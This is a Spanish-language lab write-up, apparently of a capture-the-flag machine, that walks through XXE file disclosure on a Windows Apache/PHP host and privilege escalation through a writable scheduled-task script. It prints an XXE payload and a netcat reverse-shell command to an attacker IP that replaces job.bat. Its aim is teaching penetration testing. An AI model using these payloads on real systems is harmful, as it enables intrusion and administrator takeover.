bash

**Puertos encontrados:**

| Puerto | Servicio | Versión |
| --- | --- | --- |

| 80 | HTTP | Apache 2.4.41 (Win64) PHP/7.2.28 |
| 443 | HTTPS | Apache 2.4.41 (Win64) PHP/7.2.28 |

**Conclusiones del nmap:**

- Máquina **Windows** — OpenSSH for Windows y Win64

### 💉 3. Explotación — XXE

El parámetro `<item>` refleja el contenido en la respuesta → vulnerable a **XXE**.

### Payload base

xml

`<?xml version = "1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/ruta/archivo">]>
<order>
    <quantity>1</quantity>
    <item>&xxe;</item>
    <address>test</address>
</order>`

### ⬆️ 6. Escalada de privilegios

### Verificar permisos sobre job.bat

bash

`icacls C:\Log-Management\job.bat`

`C:\Log-Management\job.bat BUILTIN\Users:(F)`

**`(F)` = Full Control** → Daniel puede modificar el archivo!

### Subir nc64.exe a la máquina

bash

`# Desde Kali
scp -i ~/.ssh/id_rsa_daniel nc64.exe daniel@10.129.50.123:C:/xampp/htdocs/`

### Levantar listener en Kali

bash

`nc -lvnp 4444`

### Reemplazar job.bat con reverse shell

bash

`echo C:\xampp\htdocs\nc64.exe -e cmd.exe 10.10.14.80 4444 > "C:\Log-Management\job.bat"`

### Esperar la tarea programada

La tarea programada ejecuta `job.bat` automáticamente como **Administrator** → recibimos la reverse shell.

### 📚 Lecciones aprendidas

- Siempre probar credenciales por defecto en formularios de login
- Revisar el código fuente en busca de comentarios con información sensible
- Cuando hay XML → probar XXE
- En Windows, el campo `<item>` que refleja contenido es el vector de inyección
- Verificar permisos de archivos con `icacls` — `(F)` = Full Control = escalada posible
- Las tareas programadas que ejecutan scripts modificables = vector de escalada
